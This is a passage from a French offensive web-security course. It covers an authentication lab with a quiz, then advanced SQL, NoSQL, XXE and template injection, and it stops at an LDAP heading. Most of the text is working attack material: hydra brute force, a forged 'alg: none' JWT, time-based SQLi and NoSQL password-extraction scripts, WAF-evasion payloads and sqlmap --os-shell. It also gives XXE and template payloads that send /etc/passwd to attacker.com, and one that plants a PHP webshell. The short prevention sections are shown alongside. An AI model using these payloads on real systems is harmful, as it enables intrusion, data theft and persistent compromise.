   hydra -l admin -P /usr/share/wordlists/rockyou.txt MACHINE_IP http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid password"
   ```

3. **Accès au premier compte** :
   - Connectez-vous avec les identifiants découverts
   - Récupérez le premier flag
   - Notez toute information utile pour la suite

#### Partie 3 : Bypass de JWT

1. **Analyse du token** :
   - Après connexion, examinez les cookies avec les DevTools
   - Identifiez le token JWT
   - Décodez-le sur jwt.io

2. **Manipulation du token** :
   - Modifiez le payload pour élever vos privilèges
   - Essayez l'attaque "alg: none"
   - Testez la confusion d'algorithme

3. **Exploitation** :
   ```
   # Token JWT original
   eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoidXNlciJ9.abc123signature
   
   # Token modifié (alg: none, role: admin)
   eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
   ```

4. **Accès à la zone admin** :
   - Utilisez le token modifié
   - Accédez à la section administrative
   - Récupérez le deuxième flag

#### Partie 4 : Bypass de 2FA

1. **Analyse du flux 2FA** :
   - Connectez-vous avec des identifiants valides
   - Observez le processus de vérification 2FA
   - Interceptez les requêtes avec Burp Suite

2. **Identification des vulnérabilités** :
   - Testez la réutilisation de codes OTP
   - Vérifiez si le statut 2FA est correctement validé
   - Essayez d'accéder directement aux pages protégées

3. **Exploitation** :
   ```
   # Tentative d'accès direct après authentification initiale
   GET /dashboard HTTP/1.1
   Host: MACHINE_IP
   Cookie: session=abc123
   ```

4. **Contournement par manipulation de paramètres** :
   - Modifiez les paramètres de requête ou les cookies
   - Testez des variations comme `?skip_2fa=true`
   - Essayez de modifier les variables de session

5. **Récupération du flag final** :
   - Accédez à la zone protégée par 2FA
   - Localisez et récupérez le dernier flag
   - Documentez la méthode d'exploitation

#### Rapport et réflexion

Pour chaque vulnérabilité exploitée, documentez :
1. La vulnérabilité identifiée
2. La méthode d'exploitation
3. L'impact dans un environnement réel
4. Les mesures de correction recommandées

**Exemple de rapport pour la partie 3 (Bypass de JWT) :**
```
Vulnérabilité : Manipulation de JWT avec algorithme "none"
Méthode d'exploitation : Modification du header pour utiliser alg:none et élévation des privilèges dans le payload
Impact : Élévation de privilèges non autorisée, accès à des fonctionnalités administratives
Correction : Valider strictement l'algorithme attendu, implémenter une liste blanche d'algorithmes, vérifier la signature
```

**En clair, pour un débutant :**
Ce mini-lab est comme un parcours d'obstacles centré sur les failles d'authentification. Vous commencez par découvrir quels utilisateurs existent dans le système en exploitant des messages d'erreur révélateurs. Ensuite, vous forcez l'accès à un compte en testant systématiquement des mots de passe. Puis, vous falsifiez votre badge numérique (JWT) pour obtenir des privilèges d'administrateur. Enfin, vous contournez la double authentification en exploitant des failles dans sa mise en œuvre. C'est comme apprendre à ouvrir différents types de serrures dans un environnement contrôlé et éducatif.

### Quiz

1. **Quelle technique permet d'identifier des noms d'utilisateurs valides en analysant les différences dans les messages d'erreur ?**
   - A) Brute force
   - B) Credential stuffing
   - C) User enumeration
   - D) Password spraying
   
   *Réponse : C) User enumeration*

2. **Quel flag de cookie empêche l'accès au cookie via JavaScript, protégeant ainsi contre les attaques XSS ?**
   - A) Secure
   - B) HttpOnly
   - C) SameSite
   - D) Domain
   
   *Réponse : B) HttpOnly*

3. **Quelle vulnérabilité JWT permet à un attaquant de modifier le contenu du token sans connaître la clé secrète ?**
   - A) Brute force de la clé
   - B) Attaque "alg: none"
   - C) Confusion d'algorithme
   - D) Injection SQL
   
   *Réponse : B) Attaque "alg: none"*

4. **Dans le contexte OAuth, quelle vulnérabilité expose le token d'accès directement dans l'URL ?**
   - A) CSRF sur la redirection
   - B) Fuite de token dans le flux implicite
   - C) Redirection URI non validée
   - D) Interception de code d'autorisation
   
   *Réponse : B) Fuite de token dans le flux implicite*

5. **Quelle technique de bypass MFA consiste à bombarder l'utilisateur de notifications jusqu'à ce qu'il accepte par erreur ?**
   - A) SIM Swapping
   - B) Phishing en temps réel
   - C) Fatigue d'authentification
   - D) Race condition
   
   *Réponse : C) Fatigue d'authentification*
## PARTIE E — Niveau Avancé 3 : Injection Attacks

### Advanced SQLi (time-based, stacked, WAF evasion)

L'injection SQL avancée va au-delà des techniques de base pour exploiter des scénarios plus complexes et contourner les protections.

#### Injection SQL basée sur le temps (Time-based)

Cette technique est utilisée lorsque les résultats de l'injection ne sont pas directement visibles dans la réponse.

##### Principe de fonctionnement

L'attaquant injecte une condition qui, si vraie, provoque un délai dans la réponse :

```sql
-- MySQL
' OR IF(condition_à_tester, SLEEP(5), 0) -- 

-- PostgreSQL
' OR (CASE WHEN condition_à_tester THEN pg_sleep(5) ELSE pg_sleep(0) END) -- 

-- SQL Server
' OR IF condition_à_tester WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0' -- 
```

##### Extraction de données bit par bit

Pour extraire des données, on teste chaque bit de chaque caractère :

```sql
-- Vérifier si le premier caractère du mot de passe admin est 'a' (ASCII 97)
' OR IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=97, SLEEP(5), 0) -- 

-- Vérifier si le premier bit du premier caractère est 1
' OR IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))&1=1, SLEEP(5), 0) -- 
```

##### Script d'extraction automatisée

```python
import requests
import time

url = "https://vulnerable-site.com/search"
timeout_threshold = 3  # Seuil de détection du délai

def extract_data(query, length=20):
    result = ""
    for pos in range(1, length + 1):
        char_value = 0
        for bit in range(7):  # 7 bits pour ASCII
            bit_value = 2**bit
            payload = f"' OR IF(ASCII(SUBSTRING(({query}),{pos},1))&{bit_value}={bit_value}, SLEEP(5), 0) -- "
            
            params = {"q": payload}
            start_time = time.time()
            response = requests.get(url, params=params)
            request_time = time.time() - start_time
            
            if request_time > timeout_threshold:
                char_value += bit_value
                
        if char_value == 0:
            break  # Fin de la chaîne
        result += chr(char_value)
        print(f"Position {pos}: {chr(char_value)} (ASCII: {char_value})")
    
    return result

# Exemple d'utilisation
admin_password = extract_data("SELECT password FROM users WHERE username='admin'")
print(f"Mot de passe admin: {admin_password}")
```

#### Requêtes SQL empilées (Stacked Queries)

Les requêtes empilées permettent d'exécuter plusieurs instructions SQL dans une seule injection.

##### Principe de fonctionnement

L'attaquant utilise le point-virgule (`;`) pour terminer la requête légitime et en ajouter d'autres :

```sql
-- Requête originale
SELECT * FROM products WHERE id = 1;

-- Injection avec requête empilée
1; DROP TABLE users; --
```

##### Exemples d'exploitation

1. **Insertion de données** :
   ```sql
   1; INSERT INTO users (username, password, role) VALUES ('hacker', 'password123', 'admin'); --
   ```

2. **Modification de données** :
   ```sql
   1; UPDATE users SET role = 'admin' WHERE username = 'victim'; --
   ```

3. **Exécution de procédures stockées** :
   ```sql
   -- SQL Server
   1; EXEC xp_cmdshell 'whoami'; --
   
   -- MySQL (si activé)
   1; SELECT sys_exec('id'); --
   
   -- PostgreSQL
   1; SELECT pg_read_file('/etc/passwd'); --
   ```

##### Détection de la prise en charge

Toutes les technologies ne supportent pas les requêtes empilées :

```sql
-- Test de support
1; SELECT 'test_stacked_queries'; --
```

Si la seconde requête est exécutée, les requêtes empilées sont supportées.

#### Contournement de WAF (Web Application Firewall)

Les WAF tentent de bloquer les injections SQL en détectant des motifs suspects. Voici comment les contourner.

##### Techniques d'encodage

1. **Encodage hexadécimal** :
   ```sql
   -- Au lieu de: ' OR 1=1 --
   ' OR 0x31=0x31 --
   ```

2. **Commentaires imbriqués** :
   ```sql
   -- Au lieu de: ' UNION SELECT
   ' UN/**/ION SEL/**/ECT
   ```

3. **Encodage Unicode** :
   ```sql
   -- Au lieu de: ' OR 'a'='a
   ' OR N'a'=N'a
   ```

##### Variations syntaxiques

1. **Opérateurs alternatifs** :
   ```sql
   -- Au lieu de: ' OR 1=1 --
   ' OR 1 IS 1 --
   ' OR 9999=9999 --
   ' OR 'abc'='abc' --
   ```

2. **Fonctions équivalentes** :
   ```sql
   -- Au lieu de: ' UNION SELECT user() --
   ' UNION SELECT current_user() --
   ```

3. **Espaces alternatifs** :
   ```sql
   -- Au lieu d'espaces
   '/**/OR/**/1=1/**/--
   '%09OR%091=1%09--  -- Tabulation (ASCII 9)
   '%0AOR%0A1=1%0A--  -- Nouvelle ligne (ASCII 10)
   ```

##### Contournement de filtres spécifiques

1. **Filtres de mots-clés** :
   ```sql
   -- Si "UNION" est filtré
   'UNunionION SEselectLECT 1,2,3--
   
   -- Si "SELECT" est filtré
   ' UNION all SEL/**/ECT 1,2,3--
   ```

2. **Filtres de caractères** :
   ```sql
   -- Si les guillemets simples sont filtrés
   -- MySQL permet d'utiliser des guillemets doubles pour les chaînes
   " OR 1=1 --
   
   -- Ou utiliser des fonctions de chaîne
   SELECT CHAR(65, 66, 67)  -- Produit "ABC"
   ```

3. **Filtres de commentaires** :
   ```sql
   -- Si -- est filtré
   ' OR 1=1 /*
   ' OR 1=1 #
   ' OR 1=1 ;
   ```

##### Exemple de bypass WAF complet

```sql
-- Injection originale bloquée par WAF
' UNION SELECT username, password FROM users --

-- Version avec bypass
'/*!50000UnIoN*//*!50000SeLeCt*/+username,password+/*!50000FrOm*/+users--
```

#### Exploitation avancée avec sqlmap

sqlmap est un outil puissant pour l'exploitation automatisée des injections SQL.

##### Options avancées

```bash
# Détection de WAF et tentatives de contournement
sqlmap -u "http://target.com/page?id=1" --identify-waf --tamper=space2comment,between

# Exploitation de requêtes empilées
sqlmap -u "http://target.com/page?id=1" --technique=S --dbms=mysql

# Injection basée sur le temps
sqlmap -u "http://target.com/page?id=1" --technique=T --dbms=mysql --time-sec=5

# Exécution de commandes OS (si possible)
sqlmap -u "http://target.com/page?id=1" --os-shell

# Extraction de données spécifiques
sqlmap -u "http://target.com/page?id=1" --dump -T users -C username,password --where="username='admin'"
```

##### Scripts tamper

Les scripts tamper de sqlmap modifient les payloads pour contourner les WAF :

```bash
# Combinaison de scripts tamper efficaces
sqlmap -u "http://target.com/page?id=1" --tamper=between,charencode,charunicodeencode,equaltolike,space2comment,randomcase
```

Exemples de scripts tamper utiles :
- `between` : Remplace les opérateurs de comparaison par BETWEEN
- `charencode` : Encode les caractères avec la fonction CHAR()
- `space2comment` : Remplace les espaces par des commentaires
- `randomcase` : Mélange majuscules et minuscules

**En clair, pour un débutant :**
L'injection SQL avancée, c'est comme jouer aux échecs avec une base de données. Quand vous ne pouvez pas voir directement les résultats (time-based), vous posez des questions du type "si la première lettre est 'A', attends 5 secondes" et vous chronométrez la réponse. Les requêtes empilées, c'est comme glisser plusieurs ordres dans une seule enveloppe. Et contourner un WAF, c'est comme déguiser vos mots pour passer les filtres de censure, en écrivant "S E L E C T" au lieu de "SELECT" ou en utilisant des synonymes pour tromper la surveillance.

### NoSQL Injection (Mongo, $ne)

Les injections NoSQL ciblent les bases de données non relationnelles comme MongoDB, qui stockent les données au format document plutôt qu'en tables.

#### Différences avec les injections SQL

| SQL | NoSQL |
|-----|-------|
| Syntaxe SQL standardisée | Syntaxe spécifique à chaque système |
| Requêtes basées sur des chaînes | Requêtes souvent basées sur des objets |
| Injection via manipulation de chaînes | Injection via manipulation d'objets ou de JSON |
| Utilise des opérateurs comme `'`, `"`, `--` | Utilise des opérateurs comme `$ne`, `$gt`, `$regex` |

#### MongoDB et ses opérateurs vulnérables

MongoDB utilise un format de requête basé sur des documents JSON. Ses opérateurs de requête peuvent être exploités :

- `$eq` : égal à
- `$ne` : différent de
- `$gt` : supérieur à
- `$lt` : inférieur à
- `$regex` : correspondance d'expression régulière
- `$where` : permet d'exécuter du JavaScript

#### Vecteurs d'injection courants

##### Authentification bypass

Dans une application Node.js/Express avec MongoDB :

```javascript
// Code vulnérable
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  
  db.collection('users').findOne({
    username: username,
    password: password
  }, (err, user) => {
    if (user) {
      // Authentification réussie
    } else {
      // Échec d'authentification
    }
  });
});
```

**Exploitation via JSON** :

Si l'application accepte du JSON dans le corps de la requête :

```json
{
  "username": {"$ne": null},
  "password": {"$ne": null}
}
```

Cette requête recherche un utilisateur dont le nom d'utilisateur n'est pas null ET dont le mot de passe n'est pas null, ce qui correspond généralement au premier utilisateur de la base.

**Exploitation via paramètres URL** :

```
/login?username[$ne]=null&password[$ne]=null
```

##### Injection dans les recherches

Pour une recherche de produits :

```javascript
// Code vulnérable
app.get('/products', (req, res) => {
  const query = { category: req.query.category };
  db.collection('products').find(query).toArray((err, products) => {
    res.json(products);
  });
});
```

**Exploitation** :

```
/products?category[$ne]=null
```

Cette requête retourne tous les produits, quelle que soit leur catégorie.

##### Extraction de données avec $regex

Pour extraire des informations caractère par caractère :

```
/users?username[$regex]=^a
/users?username[$regex]=^b
...
```

En testant systématiquement, on peut déterminer le premier caractère, puis :

```
/users?username[$regex]=^a.
/users?username[$regex]=^aa
/users?username[$regex]=^ab
...
```

##### Exécution de code avec $where

L'opérateur `$where` permet d'exécuter du code JavaScript :

```javascript
// Code vulnérable
app.get('/users', (req, res) => {
  const query = { $where: `this.username === '${req.query.username}'` };
  db.collection('users').find(query).toArray((err, users) => {
    res.json(users);
  });
});
```

**Exploitation** :

```
/users?username=admin' || this.password.startsWith('a') || 'a'=='
```

Cette injection teste si le mot de passe commence par 'a'. En utilisant des techniques similaires à l'injection SQL basée sur le temps, on peut extraire le mot de passe complet.

#### Techniques d'exploitation avancées

##### Opérateurs d'agrégation

MongoDB propose un framework d'agrégation puissant qui peut être exploité :

```
/analytics?group={"$where": "sleep(5000)"}
```

##### Injection dans les projections

Les projections MongoDB déterminent quels champs retourner :

```javascript
// Code vulnérable
app.get('/users', (req, res) => {
  const fields = {};
  fields[req.query.field] = 1;
  
  db.collection('users').find({}, fields).toArray((err, users) => {
    res.json(users);
  });
});
```

**Exploitation** :

```
/users?field=username&field[$ne]=null
```

##### Attaques NoSQL aveugles

Similaires aux injections SQL basées sur le temps :

```javascript
// Injection dans une requête
{ "username": "admin", "password": { "$regex": "^a.*", "$ne": null } }
```

Si cette requête retourne un résultat, le mot de passe commence par 'a'.

#### Outils spécialisés

##### NoSQLMap

NoSQLMap est un outil d'exploitation automatisé pour les bases NoSQL :

```bash
# Installation
git clone https://github.com/codingo/NoSQLMap.git
cd NoSQLMap
pip install -r requirements.txt

# Utilisation
python nosqlmap.py
```

##### Outils personnalisés

Script Python pour tester une injection NoSQL dans un formulaire de connexion :

```python
import requests
import string
import time

url = "http://vulnerable-site.com/login"
headers = {"Content-Type": "application/json"}
valid_chars = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?"

def extract_password():
    password = ""
    while True:
        found = False
        for char in valid_chars:
            payload = {
                "username": "admin",
                "password": {"$regex": f"^{password}{char}.*"}
            }
            
            start_time = time.time()
            response = requests.post(url, json=payload, headers=headers)
            request_time = time.time() - start_time
            
            if "Login successful" in response.text or response.status_code == 200:
                password += char
                found = True
                print(f"Password so far: {password}")
                break
        
        if not found:
            break
    
    return password

admin_password = extract_password()
print(f"Admin password: {admin_password}")
```

#### Prévention des injections NoSQL

##### Validation des entrées

```javascript
// Utilisation de Joi pour la validation
const Joi = require('joi');

const schema = Joi.object({
  username: Joi.string().alphanum().min(3).max(30).required(),
  password: Joi.string().min(6).required()
});

app.post('/login', (req, res) => {
  const { error, value } = schema.validate(req.body);
  
  if (error) {
    return res.status(400).send(error.details[0].message);
  }
  
  // Continuer avec des entrées validées
});
```

##### Utilisation de fonctions de requête sécurisées

```javascript
// Au lieu de construire des objets de requête dynamiquement
app.get('/users', (req, res) => {
  const username = req.query.username;
  
  // Approche sécurisée
  if (username) {
    db.collection('users').find({ username: username }).toArray((err, users) => {
      res.json(users);
    });
  } else {
    db.collection('users').find({}).toArray((err, users) => {
      res.json(users);
    });
  }
});
```

##### Désactivation des fonctionnalités dangereuses

Pour MongoDB, désactiver l'exécution JavaScript côté serveur :

```javascript
// Dans la configuration MongoDB
mongod --noscripting
```

**En clair, pour un débutant :**
L'injection NoSQL, c'est comme l'injection SQL mais pour des bases de données modernes qui stockent des documents au lieu de tables. Au lieu d'injecter des morceaux de SQL comme `' OR 1=1 --`, vous injectez des structures JSON comme `{"$ne": null}` qui signifie "différent de null". C'est particulièrement dangereux car ces injections contournent souvent les protections conçues uniquement pour les injections SQL traditionnelles. L'opérateur `$ne` est la star de ces attaques, permettant de dire "donne-moi tout sauf..." pour contourner l'authentification.

### XXE Injection (local file read + OOB)

L'injection d'entités XML externes (XXE) exploite les parseurs XML qui traitent les références à des entités externes.

#### Bases du XML et des DTD

Le XML (eXtensible Markup Language) permet de définir des entités via les DTD (Document Type Definition) :

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE exemple [
  <!ENTITY entite "valeur">
]>
<exemple>&entite;</exemple>
```

Dans cet exemple, `&entite;` sera remplacé par "valeur" lors du traitement.

#### Entités externes

Les entités externes permettent d'inclure du contenu depuis des sources externes :

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE exemple [
  <!ENTITY externe SYSTEM "file:///etc/passwd">
]>
<exemple>&externe;</exemple>
```

Ce XML tente de lire le fichier `/etc/passwd` et d'inclure son contenu.

#### Types de vulnérabilités XXE

##### Lecture de fichiers locaux

La forme la plus courante de XXE permet de lire des fichiers sur le serveur :

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data><content>&file;</content></data>
```

##### Scan de ports internes

XXE peut être utilisé pour scanner des ports sur le réseau interne :

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY scan SYSTEM "http://internal-service:8080/">
]>
<data><content>&scan;</content></data>
```

Si le service est disponible, le contenu sera inclus. Sinon, une erreur sera générée.

##### Server-Side Request Forgery (SSRF)

XXE peut forcer le serveur à effectuer des requêtes HTTP :

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<data><content>&ssrf;</content></data>
```

Cet exemple tente d'accéder aux métadonnées AWS EC2.

#### XXE Out-of-Band (OOB)

Les attaques XXE Out-of-Band sont utilisées lorsque les résultats ne sont pas directement visibles dans la réponse.

##### Exfiltration via DNS

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<data></data>
```

Le fichier evil.dtd sur le serveur de l'attaquant contient :

```xml
<!ENTITY % all "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%all;
%exfil;
```

Cette technique envoie le contenu du fichier `/etc/passwd` au serveur de l'attaquant via une requête HTTP.

##### Exfiltration via FTP

Pour les fichiers plus volumineux :

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<data></data>
```

Le fichier evil.dtd contient :

```xml
<!ENTITY % all "<!ENTITY exfil SYSTEM 'ftp://attacker.com:21/%file;'>">
%all;
%exfil;
```

#### Techniques d'exploitation avancées

##### Contournement de restrictions

Si certains protocoles sont bloqués, essayez des alternatives :

```xml
<!-- Si file:// est bloqué -->
<!ENTITY data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">

<!-- Si http:// est bloqué -->
<!ENTITY data SYSTEM "https://attacker.com/collect">

<!-- Si les deux-points sont filtrés -->
<!ENTITY data SYSTEM "file:///etc/passwd">
<!ENTITY data SYSTEM "file:/etc/passwd">
```

##### Exploitation de parseurs spécifiques

Différents parseurs XML ont des vulnérabilités spécifiques :

**PHP** :
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY % payload SYSTEM "php://filter/convert.base64-encode/resource=index.php">
  <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%payload;'>">
  %param1;
]>
<data>&exfil;</data>
```

**Java** :
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data PUBLIC "-//OXML/XXE//EN" "http://attacker.com/xxe.dtd">
<data>test</data>
```

##### Blind XXE avec erreurs

Si les résultats ne sont pas visibles, on peut forcer des erreurs pour extraire des données :

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<data>test</data>
```

L'erreur générée contiendra le contenu du fichier.

#### Outils de détection et d'exploitation

##### XXEinjector

XXEinjector est un outil spécialisé pour tester les vulnérabilités XXE :

```bash
# Installation
git clone https://github.com/enjoiz/XXEinjector.git
cd XXEinjector
chmod +x XXEinjector.rb

# Utilisation basique
ruby XXEinjector.rb --host=attacker.com --file=/tmp/req.txt --path=/etc/passwd

# Exploitation OOB
ruby XXEinjector.rb --host=attacker.com --file=/tmp/req.txt --oob=http
```

##### Payload All The Things

Collection de payloads XXE pour différents contextes :

```bash
# Cloner le dépôt
git clone https://github.com/swisskyrepo/PayloadsAllTheThings.git
cd PayloadsAllTheThings/XXE\ Injection/
```

#### Prévention des attaques XXE

##### Désactivation des entités externes

**PHP** :
```php
// Désactiver les entités externes
libxml_disable_entity_loader(true);

// Utiliser le mode LIBXML_NOENT
$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_NOENT);
```

**Java** :
```java
// Pour SAX parsers
SAXParserFactory spf = SAXParserFactory.newInstance();
spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
spf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

// Pour DOM parsers
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

**Python** :
```python
from lxml import etree

# Désactiver les entités externes
parser = etree.XMLParser(resolve_entities=False)
document = etree.parse(xml_file, parser)
```

##### Utilisation d'alternatives au XML

Quand c'est possible, préférer des formats comme JSON qui ne sont pas vulnérables aux XXE.

**En clair, pour un débutant :**
L'injection XXE, c'est comme si vous donniez à un bibliothécaire une fiche de demande de livre qui contient secrètement des instructions pour aller chercher votre déclaration d'impôts dans ses dossiers personnels. Le XML permet de définir des "entités externes" qui peuvent référencer des fichiers locaux ou des URLs. Quand un serveur traite votre XML malveillant, il peut être forcé de lire des fichiers confidentiels ou d'effectuer des requêtes non autorisées. Les attaques "Out-of-Band" sont particulièrement dangereuses car elles permettent d'exfiltrer des données même quand vous ne voyez pas directement le résultat de l'injection.

### Server-Side Template Injection (Jinja, Pebble)

L'injection de template côté serveur (SSTI) se produit lorsqu'un attaquant peut injecter du code malveillant dans un template qui est ensuite exécuté sur le serveur.

#### Comprendre les moteurs de templates

Les moteurs de templates permettent de séparer la logique de présentation du code applicatif :

```
Template + Données = Page HTML rendue
```

Exemples de moteurs de templates populaires :
- **Jinja2** (Python)
- **Pebble** (Java)
- **Twig** (PHP)
- **Handlebars** (JavaScript)
- **Thymeleaf** (Java)

#### Identification des vulnérabilités SSTI

##### Tests de base

Pour détecter une vulnérabilité SSTI, injectez des expressions mathématiques ou des chaînes de caractères :

```
{{7*7}}      → Si rendu comme 49, potentiellement vulnérable
${7*7}       → Syntaxe alternative
<%= 7*7 %>   → Syntaxe ERB (Ruby)
${{7*7}}     → Syntaxe FreeMarker
```

##### Identification du moteur de template

Chaque moteur a sa propre syntaxe et ses propres erreurs :

| Moteur | Payload de test | Résultat attendu |
|--------|----------------|------------------|
| Jinja2 | `{{7*'7'}}` | `7777777` |
| Twig | `{{dump(app)}}` | Dump de l'objet app |
| FreeMarker | `<#list .data_model?keys as key>${key}</#list>` | Liste des clés du modèle |
| Velocity | `#set($x = 'exploit')${x}` | `exploit` |
| Handlebars | `{{#with "s" as |string|}}{{string.sub.apply string "constructor"}}{{/with}}` | `[Function: String]` |

#### Exploitation par moteur de template

##### Jinja2 (Python)

Jinja2 est particulièrement vulnérable car il permet d'accéder à l'environnement Python :

```
# Accès aux classes
{{ ''.__class__ }}                 → <class 'str'>
{{ ''.__class__.__mro__ }}         → Affiche la hiérarchie de classes
{{ ''.__class__.__mro__[1].__subclasses__() }}  → Liste toutes les sous-classes de 'object'

# Recherche de classes utiles
{% for c in ''.__class__.__mro__[1].__subclasses__() %}
  {% if c.__name__ == 'catch_warnings' %}
    {{ c.__init__.__globals__['__builtins__'] }}
  {% endif %}
{% endfor %}

# Exécution de commandes
{{ ''.__class__.__mro__[1].__subclasses__()[401]('whoami', shell=True, stdout=-1).communicate()[0].strip() }}
```

Payload complet pour l'exécution de commandes :

```
{% for c in ''.__class__.__mro__[1].__subclasses__() %}
  {% if c.__name__ == 'Popen' %}
    {{ c('cat /etc/passwd', shell=True, stdout=-1).communicate()[0].decode('utf-8') }}
  {% endif %}
{% endfor %}
```

##### Pebble (Java)

Pebble est un moteur de template Java qui peut être exploité pour exécuter du code Java :

```
# Accès à la classe Runtime
{{ application.getClass().forName('java.lang.Runtime') }}

# Obtention de l'instance Runtime
{{ application.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null) }}

# Exécution de commandes
{{ application.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('whoami') }}
```

Payload complet pour l'exécution de commandes :

```
{% set cmd = 'cat /etc/passwd' %}
{% set bytes = (application.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec(cmd)).getInputStream().readAllBytes() %}
{{ application.getClass().forName('java.lang.String').getConstructor(application.getClass().forName('[B')).newInstance(bytes) }}
```

##### Twig (PHP)

Twig est un moteur de template PHP qui peut être exploité pour exécuter du code PHP :

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

##### Handlebars (JavaScript)

Handlebars est généralement plus sécurisé, mais peut être exploité dans certaines configurations :

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

#### Techniques d'exploitation avancées

##### Contournement de filtres

Si certains caractères ou mots-clés sont filtrés, utilisez des techniques de contournement :

```
# Si les accolades {{ }} sont filtrées
{% if 1 %}Exécuté{% endif %}

# Si les guillemets sont filtrés
{{ request.args.param | default('') }}

# Si les points sont filtrés
{{ request['args']['param'] }}

# Si certains mots-clés sont filtrés
{{ request|attr('application')|attr('__globals__') }}
```

##### Exploitation aveugle

Si le résultat de l'injection n'est pas visible, utilisez des techniques out-of-band :

```
# Jinja2 avec requête HTTP
{% for c in ''.__class__.__mro__[1].__subclasses__() %}
  {% if c.__name__ == 'Popen' %}
    {{ c(['curl', 'http://attacker.com/?data=$(cat /etc/passwd | base64)'], shell=True) }}
  {% endif %}
{% endfor %}
```

##### Persistance

Pour maintenir l'accès, créez un webshell :

```
# Jinja2
{% for c in ''.__class__.__mro__[1].__subclasses__() %}
  {% if c.__name__ == 'Popen' %}
    {{ c(['echo \'<?php system($_GET["cmd"]); ?>\' > /var/www/html/shell.php'], shell=True) }}
  {% endif %}
{% endfor %}
```

#### Outils de détection et d'exploitation

##### Tplmap

Tplmap est un outil automatisé pour détecter et exploiter les vulnérabilités SSTI :

```bash
# Installation
git clone https://github.com/epinna/tplmap.git
cd tplmap
pip install -r requirements.txt

# Utilisation basique
python tplmap.py -u "http://vulnerable-site.com/page?name=John"

# Spécifier un paramètre
python tplmap.py -u "http://vulnerable-site.com/page" --data "name=John"

# Exécuter des commandes
python tplmap.py -u "http://vulnerable-site.com/page?name=John" --os-cmd "id"
```

##### Payloads manuels

Collection de payloads pour différents moteurs :

```bash
# Cloner le dépôt
git clone https://github.com/swisskyrepo/PayloadsAllTheThings.git
cd PayloadsAllTheThings/Server\ Side\ Template\ Injection/
```

#### Prévention des attaques SSTI

##### Validation des entrées

```python
# Python avec Jinja2
import re

def is_safe_template(user_input):
    # Bloquer les caractères suspects
    if re.search(r'[{{\s*|\s*}}|{%\s*|\s*%}]', user_input):
        return False
    return True

user_input = request.args.get('name', '')
if is_safe_template(user_input):
    template = env.from_string(f"Hello {user_input}!")
    return template.render()
else:
    return "Invalid input"
```

##### Utilisation de contextes de sandbox

```python
# Python avec Jinja2
from jinja2.sandbox import SandboxedEnvironment

env = SandboxedEnvironment()
template = env.from_string("Hello {{ name }}!")
result = template.render(name=user_input)
```

##### Séparation stricte du code et des templates

```python
# Python avec Jinja2 - Approche sécurisée
from jinja2 import Template

# Les templates sont stockés dans des fichiers, jamais construits dynamiquement
template = env.get_template('greeting.html')
result = template.render(name=user_input)
```

**En clair, pour un débutant :**
L'injection de template côté serveur, c'est comme si vous pouviez glisser du code dans un modèle de document que l'imprimante va exécuter au lieu de simplement l'imprimer. Les moteurs de templates comme Jinja2 ou Pebble permettent normalement d'insérer des variables dans des pages web (comme "Bonjour {{nom}}"), mais si vous pouvez injecter des expressions comme "{{7*7}}" et que le serveur les évalue, vous avez trouvé une faille. L'exploitation avancée permet d'accéder au système sous-jacent, comme si vous pouviez passer des commandes à l'ordinateur qui fait tourner l'imprimante, simplement en modifiant le contenu du document.

### LDAP & ORM Injection

Les injections LDAP et ORM sont des vulnérabilités moins connues mais tout aussi dangereuses que les injections SQL.

#### LDAP Injection

